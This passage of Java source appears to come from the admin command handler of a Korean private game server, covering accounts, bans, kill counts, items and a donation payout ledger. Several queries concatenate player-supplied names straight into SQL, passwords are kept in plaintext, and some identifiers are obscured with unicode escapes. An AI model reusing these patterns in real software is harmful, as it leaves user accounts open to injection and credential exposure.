				if (gm.물품멘트 == true) {
					SC_SystemMessage.send(gm, "이미 물품멘트 활성화 상태입니다.");
					return;
				}
				
				gm.물품멘트 = true;
				
				SC_SystemMessage.send(gm, "\\f:현 시간부로 거래게시판에 물품이 업로드 될 경우 채팅창에 출력됩니다.");
				
			} else if (status.equalsIgnoreCase("끔")) {
				if (gm.물품멘트 == false) {
					SC_SystemMessage.send(gm, "이미 물품멘트는 비활성화상태입니다.");
					return;
				}
				
				gm.물품멘트 = false;
				
				SC_SystemMessage.send(gm, "\\f:물품멘트가 비활성화되었습니다.");
			
			}
		} catch (Exception eee) {
			SC_SystemMessage.send(gm, ".물품멘트 [켬/끔] 으로 입력하세요.");
			
		}
	}
	private void 잠재력활성화(L1PcInstance gm, String param) {
		int count = 0;
		int ccount = 0;
		
		
		try {
			StringTokenizer st = new StringTokenizer(param);
			String status = st.nextToken();
			if (status.equalsIgnoreCase("켬")) {
				if (Config.잠재력활성화 == true) {
					SC_SystemMessage.send(gm, "이미 잠재력활성화 상태입니다.");
					return;
				}
				for (Object obj : L1World.getInstance().getObject()) {
					if (obj instanceof L1DollInstance) {
						L1DollInstance 인형 = (L1DollInstance) obj;
						if (인형.getMaster() != null) {
							count++;
							인형.deleteDoll(false);
						}
					}
				}
				Config.잠재력활성화 = true;
				
				SC_SystemMessage.send(gm, "잠재력이 활성화되어 옵션들이 리프레쉬되어야 하기 때문에");
				SC_SystemMessage.send(gm, "["+count+"]개의 소환된 인형들을 비소환시켰습니다.");
				SC_SystemMessage.send(gm, "잠재력옵션표기는 리스 후에 표기됩니다.");
			} else if (status.equalsIgnoreCase("끔")) {
				if (Config.잠재력활성화 == false) {
					SC_SystemMessage.send(gm, "이미 잠재력은 비활성화상태입니다.");
					return;
				}
				for (Object obj : L1World.getInstance().getObject()) {
					if (obj instanceof L1DollInstance) {
						L1DollInstance 인형 = (L1DollInstance) obj;
						if (인형.getMaster() != null) {
							count++;
							인형.deleteDoll(false);
						}
					}
				}
				Config.잠재력활성화 = false;
				
				SC_SystemMessage.send(gm, "잠재력이 비활성화되어 옵션들이 리프레쉬되어야 하기 때문에");
				SC_SystemMessage.send(gm, "["+count+"]개의 소환된 인형들을 비소환시켰습니다.");
				SC_SystemMessage.send(gm, "잠재력옵션표기는 리스 후에 없어집니다.");
			}
		} catch (Exception eee) {
			SC_SystemMessage.send(gm, ".잠재력 [켬/끔] 으로 입력하세요.");
			
		}
	}
	private void 인형청소(L1PcInstance gm) {
		int count = 0;
		int ccount = 0;
		for (Object obj : L1World.getInstance().getObject()) {
			if (obj instanceof L1DollInstance) {
				L1DollInstance 인형 = (L1DollInstance) obj;
				if (인형.getMaster() == null) {
					count++;
					인형.deleteMe();
				} else if (((L1PcInstance) 인형.getMaster()).getNetConnection() == null) {
					ccount++;
					인형.deleteMe();
				}
			}
		}
		gm.sendPackets("인형청소 갯수 - 주인X: " + count + "  주인접종: " + ccount);
	}

	private void CharacterBalance(L1PcInstance pc, String param) {
		Connection con = null;
		PreparedStatement pstm = null;

		try {
			StringTokenizer st = new StringTokenizer(param);

			String charName = st.nextToken();
			int addDamage = Integer.parseInt(st.nextToken());
			int addDamageRate = Integer.parseInt(st.nextToken());
			int addReduction = Integer.parseInt(st.nextToken());
			int addReductionRate = Integer.parseInt(st.nextToken());

			L1PcInstance player = L1World.getInstance().getPlayer(charName);

			if (player != null) {
				player.setAddDamage(addDamage);
				player.setAddDamageRate(addDamageRate);
				player.setAddReduction(addReduction);
				player.setAddReductionRate(addReductionRate);
				player.save();
			} else {
				int i = 0;
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement(
						"update characters set AddDamage = ?, AddDamageRate = ?, AddReduction = ?, AddReductionRate = ? where char_name = ?");
				pstm.setInt(++i, addDamage);
				pstm.setInt(++i, addDamageRate);
				pstm.setInt(++i, addReduction);
				pstm.setInt(++i, addReductionRate);
				pstm.setString(++i, charName);
				pstm.executeQuery();
			}

		} catch (Exception e) {
			pc.sendPackets(".밸런스 [캐릭명] [추타] [추타확률] [리덕] [리덕확률]");
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}

	private void AddAccount(L1PcInstance gm, String account, String passwd, String Ip, String Host) {
		try {
			String login = null;
			String password = null;
			java.sql.Connection con = null;
			con = DatabaseFactory.getInstance().getConnection();
			PreparedStatement statement = null;
			PreparedStatement pstm = null; 

			password = passwd;

			statement = con.prepareStatement("select * from accounts where login Like '" + account + "'");
			ResultSet rs = statement.executeQuery();

			if (rs.next())
				login = rs.getString(1);
			if (login != null) {
				gm.sendPackets("이미 계정이 있습니다.");
				return;
			} else {
				String sqlstr = "INSERT INTO accounts SET login=?,password=?,lastactive=?,access_level=?,ip=?,host=?,banned=?,charslot=?,gamepassword=?,notice=?";
				pstm = con.prepareStatement(sqlstr);
				pstm.setString(1, account);
				pstm.setString(2, password);
				pstm.setTimestamp(3, new Timestamp(System.currentTimeMillis()));
				pstm.setInt(4, 0);
				pstm.setString(5, Ip);
				pstm.setString(6, Host);
				pstm.setInt(7, 0);
				pstm.setInt(8, 6);
				pstm.setInt(9, 0);
				pstm.setInt(10, 0);
				pstm.execute();
				gm.sendPackets("계정 추가가 완료되었습니다.");
			}

			rs.close();
			pstm.close();
			statement.close();
			con.close();
		} catch (Exception e) {
		}
	}
	private void AddAccount1(L1PcInstance gm, String account) {
		try {
			String login = null;

			java.sql.Connection con = null;
			con = DatabaseFactory.getInstance().getConnection();
			PreparedStatement statement = null;
			PreparedStatement pstm = null; 

	

			statement = con.prepareStatement("select * from \u006D\u0065\u0065\u0070 where login Like '" + account + "'");
			ResultSet rs = statement.executeQuery();
			L1ItemInstance total = gm.getInventory().findItemId(777777);
			int count = total.getCount();
			if (rs.next())
				login = rs.getString(1);
			if (login != null) {
				gm.sendPackets("\uC774\uBBF8 \uACC4\uC815\uC774 \uC788\uC2B5\uB2C8\uB2E4\u002E");
				return;
			} else {
				String sqlstr = "INSERT INTO \u006D\u0065\u0065\u0070 SET login=?, count=?";
				pstm = con.prepareStatement(sqlstr);
				pstm.setString(1, account);
				pstm.setInt(2, count);


				pstm.execute();
				gm.getInventory().consumeItem(777777, count);
				gm.sendPackets("\uB9E4\uC785\uC815\uBCF4 \uC800\uC7A5 \uC644\uB8CC" + " 매입증표 (" + count + "개)");
				gm.sendPackets("매입의 증표는 다음차에 수표로 지급 받을 수 있습니다.");
				gm.sendPackets(".매입지급 [계정아이디]");
				gm.sendPackets("지급율 : "+ Config.지급율 + " %");
			}

			rs.close();
			pstm.close();
			statement.close();
			con.close();
		} catch (Exception e) {
		}
	}
	private void AddAccount10(L1PcInstance gm, String account, int counter) {
		try {
			String login = null;

			java.sql.Connection con = null;
			con = DatabaseFactory.getInstance().getConnection();
			PreparedStatement statement = null;
			PreparedStatement pstm = null; 

	

			statement = con.prepareStatement("select * from royal where login Like '" + login + "'");
			ResultSet rs = statement.executeQuery();

			if (rs.next())
				login = rs.getString(1);
			if (account.equalsIgnoreCase(login) && rs.getInt("no") == Config.서버차수+1) {
			int item = rs.getInt("count")+counter;
				AuctionSystemTable.getInstance().AuctionUpdate44(item);
				//AuctionSystemTable.getInstance().AuctionUpdate41(item);
				gm.sendPackets("인수받지 않은 후원금액 : "+ rs.getInt("count") + " 만 + 신규후원금 : "+counter+" 만");
				gm.sendPackets("후원금 갱신 : "+item + " 만");
				return;						
			} else {
				String sqlstr = "INSERT INTO royal SET login=?, count=?, no=?";
				pstm = con.prepareStatement(sqlstr);
				pstm.setString(1, account);
				pstm.setInt(2, counter);
				pstm.setInt(3, Config.서버차수+1);
//				AuctionSystemTable.getInstance().writeTopic55(account, counter);
				pstm.execute();


				gm.sendPackets("후원 입력이 완료되었습니다.");
				gm.sendPackets("입금자 : "+account+"  금액(만) : "+counter);

			}

			rs.close();
			pstm.close();
			statement.close();
			con.close();
		} catch (Exception e) {
		}
	}


	private static boolean isDisitAlpha(String str) {
		boolean check = true;
		for (int i = 0; i < str.length(); i++) {
			if (!Character.isDigit(str.charAt(i)) // 숫자가 아니라면
					&& !Character.isUpperCase(str.charAt(i)) // 대문자가 아니라면
					&& !Character.isLowerCase(str.charAt(i))) { // 소문자가 아니라면
				check = false;
				break;
			}
		}
		return check;
	}

	private void reloadHouse(L1PcInstance gm, String cmd) {
		try {
			HouseTable.reload();
			gm.sendPackets("아지트 입찰시간이 재갱신되었습니다.");
		} catch (Exception e) {
			gm.sendPackets(".아지트갱신 으로 입력하세요.");
		}
	}

	// 인벤삭제
	private void InventoryDelete(L1PcInstance pc, String param) {
		try {
			for (L1ItemInstance item : pc.getInventory().getItems()) {
				if (!item.isEquipped()) {
					pc.getInventory().removeItem(item);
				}
			}
		} catch (Exception e) {
			pc.sendPackets(".인벤삭제");
		}
	}

	private void targetInventoryDelete(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String char_name = st.nextToken();
			L1PcInstance target = L1World.getInstance().getPlayer(char_name);
			for (L1ItemInstance item : target.getInventory().getItems()) {
				
					target.getInventory().removeItem(item);
					gm.sendPackets(target.getName()+"님의 인벤을 모두 삭제하였습니다.");
			
			}
		} catch (Exception e) {
			gm.sendPackets(".유저인벤삭제 [접속중인 캐릭명] 입력.");
		}
	}
	private void mapwho(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			int i = 0;
			try {
				i = Integer.parseInt(st.nextToken(), 10);
			} catch (Exception e) {
				i = gm.getMapId();
			}

			StringBuffer gmList = new StringBuffer();
			StringBuffer playList = new StringBuffer();
			StringBuffer noplayList = new StringBuffer();
			StringBuffer shopList = new StringBuffer();

			int countGM = 0, nocountPlayer = 0, countPlayer = 0, countShop = 0;

			for (L1Object each1 : L1World.getInstance().getVisibleObjects(i).values()) {
				if (each1 instanceof L1PcInstance) {
					L1PcInstance eachpc = (L1PcInstance) each1;

					if (eachpc.isGm()) {
						gmList.append("이름 : " + eachpc.getName() + " / 레벨 : "
								+ eachpc.getLevel() + "\n");
						countGM++;
						continue;
					}
					if (!eachpc.isPrivateShop()) {
						if (eachpc.noPlayerCK) {
							noplayList.append(eachpc.getName() + ", ");
							nocountPlayer++;
							continue;
						} else {
							playList.append("이름 : " + eachpc.getName()
							+ " / 레벨 : " + eachpc.getLevel() + "\n");
							countPlayer++;
							continue;
						}
					}
					if (eachpc.isPrivateShop()) {
						shopList.append(eachpc.getName() + ", ");
						countShop++;
					}
				}
			}

			if (gmList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 운영자 (" + countGM + "명)");
				SC_SystemMessage.send(gm, gmList.toString());
			}
			if (noplayList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 허상 (" + nocountPlayer + "개)");
				SC_SystemMessage.send(gm, noplayList.toString());
			}
			if (playList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 플레이어 (" + countPlayer + "명)");
				SC_SystemMessage.send(gm, playList.toString());
			}

			if (shopList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 개인상점 (" + countShop + "명)");
				SC_SystemMessage.send(gm, shopList.toString());
			}
		} catch (Exception e) {
		}
	}
	private void addaccount(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String user = tok.nextToken();
			String passwd = tok.nextToken();

			if (user.length() < 4) {
				gm.sendPackets("입력하신 계정명의 자릿수가 너무 짧습니다.");
				gm.sendPackets("최소 4자 이상 입력해 주십시오.");
				return;
			}
			if (passwd.length() < 4) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 짧습니다.");
				gm.sendPackets("최소 4자 이상 입력해 주십시오.");
				return;
			}

			if (passwd.length() > 12) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 깁니다.");
				gm.sendPackets("최대 12자 이하로 입력해 주십시오.");
				return;
			}

			if (isDisitAlpha(passwd) == false) {
				gm.sendPackets("암호에 허용되지 않는 문자가 포함 되어 있습니다.");
				return;
			}
			AddAccount(gm, user, passwd, "127.0.0.1", "127.0.0.1");
		} catch (Exception e) {
			gm.sendPackets(".계정추가 [계정명] [암호] 를 입력 해주세요.");
		}
	}
	private void addaccount11(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String user = tok.nextToken();
			int count = Integer.parseInt(tok.nextToken());

			if(MJCommons.isNullOrEmpty(user)){
				gm.sendPackets("만원 이상 입력이 가능 합니다.");
				return;
			}
			if(count <= 0){
				gm.sendPackets("만원 이상 입력이 가능 합니다.");
				throw new Exception();
			} 


			AddAccount10(gm, user, count);
		} catch (Exception e) {
			gm.sendPackets("\\f4.후원입금 [입금자명] [입금액](만원단위) 를 입력 해주세요.");
			gm.sendPackets("\\f4.후원입금 [홍길동] [10] 를 입력 해주세요.");
		}
	}
	private void addaccount1(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String user = tok.nextToken();


			if (user.length() < 4) {
				gm.sendPackets("입력하신 계정명의 자릿수가 너무 짧습니다.");
				gm.sendPackets("최소 4자 이상 입력해 주십시오.");
				return;
			}
			if (gm.getAccountName().equalsIgnoreCase(user)) {
				AddAccount1(gm, user);
				return;
			} else {
				gm.sendPackets("본인 계정명과 입력한 계정이 다릅니다.");
				gm.sendPackets("본인 계정명으로 입력해주세요.");
			}


		} catch (Exception e) {
			gm.sendPackets(".매입저장 [계정명] [암호] 를 입력 해주세요.");
			gm.sendPackets("단 한번만 저장 가능하니 신중히 저장해주세요.");
			gm.sendPackets("저장 후 복구는 불가능합니다.");
		}
	}
	private static void \u006D\u0065\u0065\u0070\u0035\u0035(L1PcInstance gm, String login) {

		String password = null;
		Connection con = null;
		PreparedStatement pstm = null;

		ResultSet rs = null;
	
		int itemcount = 0;
		String account = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement(
					"SELECT login, count from \u006D\u0065\u0065\u0070 where login Like '" + login + "'");
			rs = pstm.executeQuery();
			while (rs.next()) {

				itemcount = rs.getInt("count");
				account = rs.getString("login");
			}
			if (account == null) {
				gm.sendPackets("\uC800\uC7A5\uB41C \uB9E4\uC785\uC815\uBCF4\uAC00 \uC5C6\uC2B5\uB2C8\uB2E4\u002E");
				return;
			}
			 int count = (int) ((itemcount*7) *((Config.\uC9C0\uAE09\uC728*\u0031\u002E0)\u002F\u003100)) ;

			if (gm.getAccountName().equalsIgnoreCase(account)) {				
				gm.getInventory().storeItem(400254, count*7);
				AuctionSystemTable.getInstance().deleteTopic3(login);
				gm.sendPackets("증표 1개당 7억->"+Config.지급율+" % = 총지급율" );
				gm.sendPackets(\u0022\uC9C0\uAE09\uC728 \u003A \u0022 \u002B \u0043\u006F\u006E\u0066\u0069\u0067\u002E\uC9C0\uAE09\uC728 \u002B \u0022 \u0025\u0022);
				gm.sendPackets(\u0022\uC815\uC0C1 \uC9C0\uAE09 \uB418\uC5C8\uC2B5\uB2C8\uB2E4\u002E\u0022+\u0022\uBCF4\uC720\uB7C9 \u003A \u0022\u002B\u0069\u0074\u0065\u006D\u0063\u006F\u0075\u006Et \u002B \u0022 \u002F \uC9C0\uAE09\uB7C9 \u003A \u0022+\u0063\u006F\u0075\u006E\u0074);
			
			} else {
				gm.sendPackets("\uC544\uC774\uB514\uAC00 \uB2E4\uB985\uB2C8\uB2E4\u002E");
			}
		} catch (SQLException e) {
			gm.sendPackets("\u002E\uB9E4\uC785\uC9C0\uAE09 \u005B\uACC4\uC815\uC544\uC774\uB514\u005D \uB77C\uACE0 \uC801\uC5B4\uC8FC\uC2ED\uC2DC\uC694\u002E");
			gm.sendPackets("\uC608\u0029  \u002E\uB9E4\uC785\uC9C0\uAE09 \u0074\u006F\u0072\0061\u0035\u0037\u0039\u0033\u0038");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}


	private void allpresent(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			int itemid = Integer.parseInt(st.nextToken(), 10);
			int enchant = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);
			Collection<L1PcInstance> player = null;
			player = L1World.getInstance().getAllPlayers();
			for (L1PcInstance target : player) {
				if (target == null)
					continue;
				if (!target.isGhost() && !target.isPrivateShop()) {
					L1ItemInstance item = ItemTable.getInstance().createItem(itemid);
					item.setCount(count);
					item.setEnchantLevel(enchant);
					if (item != null) {
						if (target.getInventory().checkAddItem(item, count) == L1Inventory.OK) {
							target.getInventory().storeItem(item);
						}
					}
					/*SC_GMHtml.send(target, "전체선물:" + target.getName() + "", "아이템:" + item.getLogName() + " 수량:" + count + " 획득");*/
					target.sendPackets("전체 선물: " + item.getLogName() + " " + count + "개 획득 인벤토리 확인하세요");
					SC_SkillSound.send(target, target.getId(), 1091);// 비둘기액션
					SC_SkillSound.send(target, target.getId(), 4856);// 하트액션
					// target.sendPackets("\\aD운영자의 전체선물 :
					// "+item.getLogName())); // item.getLogName
					// //item.getViewName
				}
			}
		} catch (Exception exception) {
			gm.sendPackets(".전체선물 [템ID] [인첸] [갯수]");
		}
	}

	private void returnEXP(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				int oldLevel = target.getLevel();
				int needExp = ExpTable.getNeedExpNextLevel(oldLevel);
				int exp = 0;
				if (oldLevel >= 1 && oldLevel < 11) {
					exp = 0;
				} else if (oldLevel >= 11 && oldLevel < 45) {
					exp = (int) (needExp * 0.1);
				} else if (oldLevel == 45) {
					exp = (int) (needExp * 0.09);
				} else if (oldLevel == 46) {
					exp = (int) (needExp * 0.08);
				} else if (oldLevel == 47) {
					exp = (int) (needExp * 0.07);
				} else if (oldLevel == 48) {
					exp = (int) (needExp * 0.06);
				} else if (oldLevel >= 49) {
					exp = (int) (needExp * 0.05);
				}
				target.addExp(+exp);
				target.save();
				target.saveInventory();

				gm.sendPackets("해당 캐릭터 +5 상승");
			} else {
				gm.sendPackets("해당 캐릭터 미접속 상태.");
			}
		} catch (Exception e) {
			gm.sendPackets(".경치복구 [캐릭명]");
		}
	}

	// .계정 -----------------------------------------------------------------
	// 같은계정에 있는 캐릭 검사
	private void account_Cha(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String name = tok.nextToken();
			account_Cha2(gm, name);
		} catch (Exception e) {
			gm.sendPackets(".계정 아이디");
		}
	}

	
	
	
	
	private void 킬삭제(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		float win = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			
			win = 유저.getKDA().kill;
			if (이름 != null) {
				
					if (win < id) {
						gm.sendPackets("감소시키려고 하는 킬포인트보다 유저의 킬포인트가 적습니다");
						return;
					}
				유저.getKDA().킬삭제(유저, id);
				MJKDALoader.getInstance().store();
				
				
				gm.sendPackets(유저.getName() + "님의 킬포인트 [" + id + "] 감소시켰습니다.");
				SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,"당신의 킬포인트를 운영자님께서 ["+id+"] 감소시켰습니다.");
				
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".킬삭제 캐릭명 포인트값");
			gm.sendPackets("\\f:[킬데스 관련 명령어]");
			gm.sendPackets("\\f:.킬삭제 .킬증가 .데스삭제 .데스증가");
		}
	}
	
	private void 킬증가(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		float win = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			
			win = 유저.getKDA().kill;
			if (이름 != null) {
				
//					if (win < id) {
//						gm.sendPackets("감소시키려고 하는 킬포인트보다 유저의 킬포인트가 적습니다");
//						return;
//					}
				유저.getKDA().킬증가(유저, id);
				MJKDALoader.getInstance().store();
				
				
				gm.sendPackets(유저.getName() + "님의 킬포인트 [" + id + "] 증가시켰습니다.");
				SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,"당신의 킬포인트를 운영자님께서 ["+id+"] 증가시켰습니다.");
				
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".킬증가 캐릭명 포인트값");
			gm.sendPackets("\\f:[킬데스 관련 명령어]");
			gm.sendPackets("\\f:.킬삭제 .킬증가 .데스삭제 .데스증가");
		}
	}
	
	
	private void 데스삭제(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		float win = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			
			win = 유저.getKDA().death;
			if (이름 != null) {
				
					if (win < id) {
						gm.sendPackets("감소시키려고 하는 데스포인트보다 유저의 데스포인트가 적습니다");
						return;
					}
				유저.getKDA().데스삭제(유저, id);
				MJKDALoader.getInstance().store();
				
				
				gm.sendPackets(유저.getName() + "님의 데스포인트 [" + id + "] 감소시켰습니다.");
				SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,"당신의 데스포인트를 운영자님께서 ["+id+"] 감소시켰습니다.");
				
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".데스삭제 캐릭명 포인트값");
			gm.sendPackets("\\f:[킬데스 관련 명령어]");
			gm.sendPackets("\\f:.킬삭제 .킬증가 .데스삭제 .데스증가");
		}
	}
	
	private void 데스증가(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		float win = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			
			win = 유저.getKDA().death;
			if (이름 != null) {
				
//					if (win < id) {
//						gm.sendPackets("감소시키려고 하는 킬포인트보다 유저의 킬포인트가 적습니다");
//						return;
//					}
				유저.getKDA().데스증가(유저, id);
				MJKDALoader.getInstance().store();
				
				
				gm.sendPackets(유저.getName() + "님의 데스포인트 [" + id + "] 증가시켰습니다.");
				SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,"당신의 데스포인트를 운영자님께서 ["+id+"] 증가시켰습니다.");
				
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".데스증가 캐릭명 포인트값");
			gm.sendPackets("\\f:[킬데스 관련 명령어]");
			gm.sendPackets("\\f:.킬삭제 .킬증가 .데스삭제 .데스증가");
		}
	}
	
	
	
	
	private void account_Cha2(L1PcInstance gm, String param) {
		try {
			String s_account = null;
			String s_name = param;
			String s_level = null;
			String s_clan = null;
			String s_bonus = null;
			String s_online = null;
			String s_hp = null;
			String s_mp = null;
			String s_type = null;// 추가
			int count = 0;
			int count0 = 0;
			java.sql.Connection con0 = null; // 이름으로 objid를 검색하기 위해
			con0 = DatabaseFactory.getInstance().getConnection();
			PreparedStatement statement0 = null;
			statement0 = con0.prepareStatement(
					"select account_name, Clanname  from characters where char_name = '" + s_name + "'");
			ResultSet rs0 = statement0.executeQuery();
			while (rs0.next()) {
				s_account = rs0.getString(1);
				s_clan = rs0.getString(2);
				gm.sendPackets("\\aD------------------------------------------");
				gm.sendPackets("\\aE캐릭 : " + s_name + "(" + s_account + ")  클랜 : " + s_clan);// +"
				// 클래스:"
				// +
				// s_type
				count0++;
			}
			java.sql.Connection con = null;
			con = DatabaseFactory.getInstance().getConnection();
			PreparedStatement statement = null;
			statement = con.prepareStatement(
					"select " + "char_name," + "level," + "Clanname," + "BonusStatus," + "OnlineStatus," + "MaxHp,"
							+ "MaxMp, " + "Type " + " from characters where account_name = '" + s_account + "'");
			gm.sendPackets("\\aD------------------------------------------");
			ResultSet rs = statement.executeQuery();
			while (rs.next()) {
				s_name = rs.getString(1);
				s_level = rs.getString(2);
				s_clan = rs.getString(3);
				s_bonus = rs.getString(4);
				s_online = rs.getString(5);
				s_hp = rs.getString(6);
				s_mp = rs.getString(7);
				s_type = rs.getString(8);
				gm.sendPackets("접속:[" + s_online + "] 랩:" + s_level + " [" + s_name + "] 클래스:" + s_type + "");
				count++;
			}
			rs0.close();
			statement0.close();
			con0.close();
			rs.close();
			statement.close();
			con.close();
			gm.sendPackets("\\aF0군주 1기사 2요정 3법사 4다엘 5용기사 6환술");
			gm.sendPackets("\\aD------------------------------------------");
		} catch (Exception e) {
		}
	}

	// .계정 -----------------------------------------------------------------

	private void Pvp(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String type = st.nextToken();

			if (type.equals("켬")) {
				Config.ALT_NONPVP = true;
				Config.setParameterValue("AltNonPvP", "true");
				SC_PacketBox.broadcastGreen("지금이후 PvP가 정상적으로 가능합니다.");
			} else if (type.equals("끔")) {
				Config.ALT_NONPVP = false;
				Config.setParameterValue("AltNonPvP", "false");
				SC_PacketBox.broadcastGreen("지금이후 PvP가 일정시간동안 불가능 합니다.");
			}

		} catch (Exception exception) {
			gm.sendPackets(".피케이 [켬/끔]");
		}
	}

	private void search_banned(L1PcInstance paramL1PcInstance) {
		Selector.exec(
				"select accounts.login, characters.char_name from accounts,characters where accounts.banned=62 || accounts.banned=87 || accounts.banned=95 and accounts.login=characters.account_name ORDER BY accounts.login ASC",
				new FullSelectorHandler() {
					@Override
					public void result(ResultSet rs) throws Exception {
						int i = 0;
						while (rs.next()) {
							++i;
							paramL1PcInstance
									.sendPackets(String.format("계정:[%s], 캐릭터명:[%s]", rs.getString(1), rs.getString(2)));
						}

						paramL1PcInstance.sendPackets(String.format("총 [%d]개의 압류계정/캐릭터가 검색되었습니다.", i));
					}
				});
	}

	private void accountdel(L1PcInstance gm, String param) {
		StringTokenizer tokenizer = new StringTokenizer(param);
		String chaname = tokenizer.nextToken();
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("SELECT * FROM characters WHERE char_name=?");
			pstm.setString(1, chaname);
			rs = pstm.executeQuery();
			if (!rs.next()) {
				gm.sendPackets(String.format("DB에 %s 캐릭명이 존재 하지 않습니다.", chaname));
				return;
			}

			String account = rs.getString("account_name");
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("select * from accounts WHERE login=?");
			pstm.setString(1, account);
			rs = pstm.executeQuery();
			if (!rs.next()) {
				gm.sendPackets(String.format("계정명 %s 이(가) 존재 하지 않습니다.", account));
				return;
			}

			IpTable.getInstance();
			IpTable.reload();

			String host = rs.getString("ip");
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("UPDATE accounts SET banned = 0 WHERE login= ?");
			pstm.setString(1, account);
			pstm.executeUpdate();
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("delete from ban_ip where ip=?");
			pstm.setString(1, host);
			pstm.executeUpdate();

			gm.sendPackets(String.format("%s(%s) : %s 밴 해제 완료.", chaname, account, host));
		} catch (Exception e) {
			gm.sendPackets(".압류해제 캐릭명으로 입력해주세요.");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	// private void GiveAbyssPoint(L1PcInstance pc, String poby) {
	// try {
	// StringTokenizer st = new StringTokenizer(poby);
	// String pobyname = st.nextToken();
	// int point = Integer.parseInt(st.nextToken());
	// L1PcInstance target = L1World.getInstance().getPlayer(pobyname);
	// if (target != null) {
	// target.addAbysspoint(point);
	// pc.sendPackets(target.getName() + "님에게 [어비스포인트 " +
	// point + "점] 지급."));
	// }
	// } catch (Exception e) {
	// pc.sendPackets(".어포지급 [지급캐릭명] [지급할포인트]"));
	// }
	//
	// }

	// private void GiveClanPoint(L1PcInstance pc, String poby) { // 혈맹 경험치 부여
	// try {
	// StringTokenizer st = new StringTokenizer(poby);
	// String pobyname = st.nextToken();
	// int point = Integer.parseInt(st.nextToken());
	// L1PcInstance target = L1World.getInstance().getPlayer(pobyname);
	// if (target != null) {
	// if (target.getClanid() != 0) {
	// L1Clan TargetClan = L1World.getInstance().getClan(target.getClanname());
	// TargetClan.addClanExp(point);
	// ClanTable.getInstance().updateClan(TargetClan);
	// pc.sendPackets(target.getClanname() + " 혈맹에게 [경험치 " +
	// point + "] 지급."));
	// for (L1PcInstance tc : TargetClan.getOnlineClanMember()) {
	// tc.sendPackets("게임마스터로부터 혈맹경험치 [" + point + "] 를 지급
	// 받았습니다."));
	// }
	// } else {
	// pc.sendPackets(target.getName() + "님은 혈맹에 속해 있지
	// 않습니다."));
	// }
	// } else {
	// pc.sendPackets(new SC_ServerMessage(73, pobyname));
	// }
	// } catch (Exception e) {
	// pc.sendPackets(".혈맹경험치 [지급할혈맹군주이름] [지급할 포인트]"));
	// }
	//
	// }

	private void changePassword(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String user = tok.nextToken();
			String passwd = tok.nextToken();

			if (passwd.length() < 4) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 짧습니다.");
				gm.sendPackets("최소 4자 이상 입력해 주십시오.");
				return;
			}

			if (passwd.length() > 12) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 깁니다.");
				gm.sendPackets("최대 12자 이하로 입력해 주십시오.");
				return;
			}

			if (isDisitAlpha(passwd) == false) {
				gm.sendPackets("암호에 허용되지 않는 문자가 포함되었습니다.");
				return;
			}
